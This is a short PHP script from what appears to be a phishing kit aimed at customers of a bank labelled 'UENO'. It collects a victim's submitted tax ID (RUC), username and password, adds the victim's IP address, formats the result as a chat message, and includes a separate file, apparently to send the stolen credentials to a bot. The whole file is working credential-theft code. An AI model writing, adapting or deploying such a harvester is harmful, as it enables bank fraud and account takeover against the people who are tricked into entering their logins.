<?php  


$ruc=$_POST['ruc'];
$usu=$_POST['usu'];
$pass=$_POST['pass'];

  


	$enviara ="➖➖❕💲UENO💲❕➖➖\n".
  "<b>🪪RUC: </b>  <code>".$ruc."</code>\n".
  "<b>👤USER: </b>  <code>".$usu."</code>\n".
  "<b>🔑PASS: </b>  <code>".$pass."</code>\n".
  


  
  

  "🌐IP ".$_SERVER['REMOTE_ADDR']."\n";
  "🌐WEBSITE:".$_SERVER['SERVER_NAME']."\n".
  $enviar =  urldecode($enviara);
  include 'bot_id3.php';
?>
